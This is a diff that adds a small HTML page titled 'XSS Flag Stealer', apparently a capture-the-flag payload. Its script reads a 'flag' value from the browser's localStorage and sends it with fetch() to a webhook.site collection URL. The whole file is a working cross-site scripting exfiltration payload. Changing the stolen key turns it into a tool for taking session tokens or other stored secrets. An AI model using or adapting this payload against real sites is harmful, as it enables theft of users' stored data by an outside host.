@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+  <head><title>XSS Flag Stealer</title></head>
+  <body>
+    <script>
+      const flag = localStorage.getItem("flag");
+      fetch("https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?flag=" + encodeURIComponent(flag));
+    </script>
+  </body>
+</html>
